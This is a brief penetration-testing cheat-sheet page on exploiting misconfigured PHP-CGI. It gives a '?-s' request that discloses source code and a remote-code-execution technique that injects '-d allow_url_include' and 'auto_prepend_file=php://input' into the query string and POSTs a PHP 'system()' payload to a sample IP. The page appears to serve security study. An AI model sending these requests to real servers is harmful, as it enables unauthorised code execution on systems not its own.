# PHP CGI Exploitation

## PHP CGI Source Disclosure

Passing '?-s' to any PHP file in a misconfiguration reveals the PHP source code of that file:

```text
http://10.10.10.10/?-s
```

## PHP CGI Remote Code Execution

The `-d` argument of php-cgi is another interesting parameter that we can use. This argument allows us to specify the configuration file's INI entries. When attempting to establish remote code execution, keep in mind that you should try to transmit PHP code to the server and have it interpret it. To accomplish this, we employ the wrapper php://input in order to parse the input.

For this, we'll need two things. On one hand, we'll need our request's PHP code to be read. We're seeking a PHP option that instructs PHP to read from a file and send it to `php://input`. Since PHP 4.2.3, the option auto prepend file has been available. The advantage of this option is that the contents of the file are included before any other file, in other words, it is the first option.

If we wish to use `php://input`, we must enable the URL to contain it, but this isn't a problem because the INI entries can be redefined. This is readily enabled with the `-d allow url include=1` option.

Assuming that we wanted to run the **id** command remotely, what we do is assemble a simple PHP script in advance which we send later via POST to the web with everything we have mentioned. 

The decoded URL looks like this:

```text
"http://10.10.10.10/?-d allow_url_include=1 -d auto_prepend_file=php://input"
```

The encoded URL looks like this:

```text
echo "<?php system('id');die(); ?>" | POST "http://10.10.10.10/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```

References:

{% embed url="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/php-cgi-exploitation-by-example/" %}



